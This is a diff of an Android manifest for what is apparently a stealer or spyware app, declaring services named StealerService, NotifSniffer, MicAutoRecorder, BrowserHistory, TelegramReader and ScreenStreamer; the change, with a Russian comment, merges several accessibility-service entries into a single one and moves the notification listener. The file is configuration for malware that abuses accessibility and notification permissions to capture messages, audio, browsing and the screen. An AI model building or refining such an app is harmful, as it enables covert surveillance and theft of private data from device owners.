@@ -53,13 +53,7 @@
             android:foregroundServiceType="dataSync"/>
         <service android:name=".CommandListener" android:exported="false"/>
 
-        <service android:name=".NotifSniffer" android:exported="true"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService"/>
-            </intent-filter>
-        </service>
-
+        <!-- ЕДИНСТВЕННЫЙ Accessibility сервис -->
         <service android:name=".StealerService" android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
@@ -69,58 +63,11 @@
                 android:resource="@xml/a11y_cfg"/>
         </service>
 
-        <service android:name=".AdminService" android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+        <service android:name=".NotifSniffer" android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService"/>
+                <action android:name="android.service.notification.NotificationListenerService"/>
             </intent-filter>
-            <meta-data android:name="android.accessibilityservice"
-                android:resource="@xml/admin_cfg"/>
-        </service>
-
-        <service android:name=".AlertService" android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService"/>
-            </intent-filter>
-            <meta-data android:name="android.accessibilityservice"
-                android:resource="@xml/alert_cfg"/>
-        </service>
-
-        <service android:name=".AppTracker" android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService"/>
-            </intent-filter>
-            <meta-data android:name="android.accessibilityservice"
-                android:resource="@xml/app_cfg"/>
-        </service>
-
-        <service android:name=".MicAutoRecorder" android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService"/>
-            </intent-filter>
-            <meta-data android:name="android.accessibilityservice"
-                android:resource="@xml/mic_cfg"/>
-        </service>
-
-        <service android:name=".BrowserHistory" android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService"/>
-            </intent-filter>
-            <meta-data android:name="android.accessibilityservice"
-                android:resource="@xml/browser_cfg"/>
-        </service>
-
-        <service android:name=".TelegramReader" android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService"/>
-            </intent-filter>
-            <meta-data android:name="android.accessibilityservice"
-                android:resource="@xml/tg_cfg"/>
         </service>
 
         <service android:name=".ScreenStreamer" android:exported="false"
